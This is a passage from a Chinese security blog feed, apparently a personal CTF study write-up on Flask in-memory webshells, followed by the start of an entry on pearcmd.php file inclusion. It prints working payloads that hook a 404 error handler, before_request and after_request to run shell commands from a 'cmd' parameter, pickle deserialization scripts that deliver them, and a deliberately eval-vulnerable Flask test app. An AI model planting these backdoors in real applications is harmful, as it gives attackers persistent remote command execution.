+<p>再跟进一下<code>register_error_handler()</code>函数</p>
+<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519173241705.png" alt="image-20240519173241705"></p>
+<p>总结前面两个的源码，猜测<code>f</code>就是返回值，文章说这里的code是404，exc_class是一个对象（个人还不是很懂这两个参数，等后面理解更深了再来理解）。payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec(&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>在传入后再访问一个不存在的页面进行传参，这里再使用前面的源码试试</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>():</span><br><span class="line">    <span class="comment"># 获取传入的 cmd 参数，并执行 eval</span></span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cmd:</span><br><span class="line">        result = <span class="built_in">eval</span>(cmd)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;No command provided&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>成功执行：<br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519175544050.png" alt="image-20240519175544050"></p>
+<p>那么为什么在这个自测试的源码中没有定义错误执行函数也能成功呢，</p>
+<p>这是因为即使你没有显式地定义 <code>@errorhandler(404)</code> 装饰器，Flask 内部依然会有一个默认的 404 错误处理器。当你访问一个不存在的 URL（比如 <code>/123</code>），Flask 会触发这个默认的 404 错误处理器。</p>
+<p>这个同样会进入到装饰器源码，所以同样可以利用。</p>
+<p>虽然这个方法在那道ctf题（题目debug为false）里面复现不出来，主要还是着重于新版的<code>Flask</code>。</p>
+<h4 id="个人学习总结"><a href="#个人学习总结" class="headerlink" title="个人学习总结"></a>个人学习总结</h4><ul>
+<li>首先就是上面的所有方式个人本地测试时在debug模式为True或者False都能打</li>
+<li>其实感觉python这几个漏洞都细细相关，python内存马的使用挺广的，个人感觉ssti、pickle反序，普通的命令执行都能用，注意融汇贯通,也许过滤可以参考ssti的过滤。</li>
+</ul>
+<p><strong>简单说明一下：</strong></p>
+<p>比如在每个payload中的<code>app.after_request_funcs</code>前面的<code>app</code>，</p>
+<ul>
+<li><p><strong>对于ssti、pickle反序和一般的命令执行的题</strong>，在flask框架里面一般都有这一串代码:</p>
+<p><code>app = Flask(__name__)</code>，这一般就已经可以让这个环境有app这个应用示例。如果没有，我们可以通过类似于ssti的链子来调用出app，如下：</p>
+<p><code>__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].before_request_funcs</code>,后续需要的连上来就行。</p>
+</li>
+</ul>
+<p><strong>在ssti和pickle的运用：</strong></p>
+<ul>
+<li><p>对于ssti就像旧版内存马样先用链子跳到<code>eval()</code>函数那里在填充进去payload即可利用</p>
+</li>
+<li><p>对于pickle，直接给出类似的pickle:</p>
+</li>
+</ul>
+<p>before_request:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(\&quot;sys\&quot;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>after_request:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>errorhandler:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span>,)</span><br><span class="line"></span><br><span class="line">c=A()</span><br><span class="line">poc = pickle.dumps(c)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(poc))</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>参考文章：<br><code>https://xz.aliyun.com/t/14421?time__1311=mqmx9QD%3D0%3Di%3DLx05DIYYIp6x02njKDuG%3DoD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F</code></p>
+<p><code>https://www.cnblogs.com/gxngxngxn/p/18181936</code></p>
+]]></content>
+  </entry>
+  <entry>
     <title>利用pearcmd.php进行文件包含</title>
     <url>/2024/04/28/pearcmd.php/</url>
     <content><![CDATA[<h3 id="pearcmd-php"><a href="#pearcmd-php" class="headerlink" title="pearcmd.php"></a>pearcmd.php</h3><p>好看，爱看，多看</p>
